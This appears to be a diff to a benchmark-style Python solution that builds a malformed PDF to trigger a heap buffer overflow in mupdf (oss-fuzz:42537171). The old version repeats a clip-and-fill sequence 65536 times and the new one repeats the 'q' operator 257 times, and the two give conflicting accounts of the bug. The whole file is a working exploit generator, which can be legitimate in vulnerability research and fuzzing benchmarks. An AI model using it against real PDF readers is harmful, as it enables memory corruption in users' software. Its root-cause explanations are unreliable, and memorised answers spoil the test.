@@ -1,66 +1,77 @@
-import zlib
+import io
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generates a Proof-of-Concept (PoC) that triggers a Heap Buffer Overflow
-        in mupdf (oss-fuzz:42537171).
+        Generate a PoC that triggers the vulnerability.
 
-        The vulnerability is caused by an unchecked growth of the graphics state
-        stack. The PDF clipping path operator `W` increments an internal counter,
-        `clip_depth`. When a subsequent path-painting operator like `f` (fill) is
-        processed while `clip_depth` is positive, a vulnerable code path is
-        triggered. This path saves the current graphics state but never restores it.
+        The vulnerability, oss-fuzz:42537171, is a heap buffer overflow in mupdf's
+        PDF interpreter. It occurs because the nesting depth of the graphics state
+        is not checked *before* pushing a new state onto the graphics state stack.
+        The stack has a hardcoded size (GSTATE_STACK_SIZE = 256 in the vulnerable version).
 
-        The PoC creates a PDF with a content stream containing a large number of
-        repetitions of the sequence "0 0 m W f ". Each repetition causes the
-        graphics state stack, a heap-allocated buffer, to grow by one element.
-        This eventually leads to a heap buffer overflow during reallocation of the
-        stack buffer.
+        Operators like 'q' (save graphics state) or 'BDC' (begin marked content)
+        trigger this push operation. By calling one of these operators more than 256
+        times, we can write past the end of the heap-allocated stack.
 
-        A repetition count of 65536 is chosen. This is a large number, likely
-        sufficient to trigger the memory corruption, while being smaller than
-        the original fuzzer-generated PoC to achieve a better score.
+        This PoC constructs a minimal PDF file with a content stream containing the
+        'q' operator repeated 257 times. The 'q' operator is chosen for its
+        compactness (1 byte), which results in a very small and efficient PoC.
+
+        Args:
+            src_path: Path to the vulnerable source code tarball (not used in this solution).
+
+        Returns:
+            bytes: The PoC input that should trigger the vulnerability.
         """
-        repeats = 65536
         
-        payload = b'0 0 m W f ' * repeats
+        # GSTATE_STACK_SIZE is 256, so 257 pushes will cause an overflow.
+        repeat_count = 257
+        # The 'q' operator saves the graphics state. It's a 1-byte operator.
+        # We add a space as a separator.
+        payload = b'q ' * repeat_count
+        payload_len = len(payload)
 
-        stream = payload
-        stream_len = len(stream)
+        # Use an in-memory buffer to build the PDF and track byte offsets.
+        out = io.BytesIO()
 
-        objs = []
+        # PDF Header
+        out.write(b'%PDF-1.7\n')
+        
         # Object 1: Document Catalog
-        objs.append(b"<< /Type /Catalog /Pages 2 0 R >>")
+        obj1_offset = out.tell()
+        out.write(b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n')
+
         # Object 2: Page Tree
-        objs.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
+        obj2_offset = out.tell()
+        out.write(b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n')
+
         # Object 3: Page Object
-        objs.append(b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>")
-        # Object 4: Content Stream
-        objs.append(f"<< /Length {stream_len} >>".encode() + b"\nstream\n" + stream + b"\nendstream")
+        obj3_offset = out.tell()
+        out.write(b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 600 800] /Contents 4 0 R >>\nendobj\n')
 
-        pdf_parts = [b"%PDF-1.7\n"]
-        offsets = []
-        
-        for i, obj_body in enumerate(objs):
-            offsets.append(len(b"".join(pdf_parts)))
-            obj_num = i + 1
-            pdf_parts.append(f"{obj_num} 0 obj\n".encode())
-            pdf_parts.append(obj_body)
-            pdf_parts.append(b"\nendobj\n")
+        # Object 4: Content Stream containing the payload
+        obj4_offset = out.tell()
+        stream_header = f'4 0 obj\n<< /Length {payload_len} >>\nstream\n'.encode('ascii')
+        out.write(stream_header)
+        out.write(payload)
+        out.write(b'\nendstream\nendobj\n')
 
-        xref_offset = len(b"".join(pdf_parts))
-        
-        pdf_parts.append(b"xref\n")
-        pdf_parts.append(f"0 {len(objs) + 1}\n".encode())
-        pdf_parts.append(b"0000000000 65535 f \n")
-        for offset in offsets:
-            pdf_parts.append(f"{offset:010d} 00000 n \n".encode())
+        # Cross-reference (xref) table
+        xref_offset = out.tell()
+        out.write(b'xref\n')
+        out.write(b'0 5\n')
+        out.write(b'0000000000 65535 f \n')
+        out.write(f'{obj1_offset:010d} 00000 n \n'.encode('ascii'))
+        out.write(f'{obj2_offset:010d} 00000 n \n'.encode('ascii'))
+        out.write(f'{obj3_offset:010d} 00000 n \n'.encode('ascii'))
+        out.write(f'{obj4_offset:010d} 00000 n \n'.encode('ascii'))
 
-        pdf_parts.append(b"trailer\n")
-        pdf_parts.append(f"<< /Size {len(objs) + 1} /Root 1 0 R >>\n".encode())
-        pdf_parts.append(b"startxref\n")
-        pdf_parts.append(f"{xref_offset}\n".encode())
-        pdf_parts.append(b"%%EOF")
+        # PDF Trailer
+        out.write(b'trailer\n')
+        out.write(b'<< /Size 5 /Root 1 0 R >>\n')
+        out.write(b'startxref\n')
+        out.write(f'{xref_offset}\n'.encode('ascii'))
+        out.write(b'%%EOF\n')
 
-        return b"".join(pdf_parts)
+        return out.getvalue()
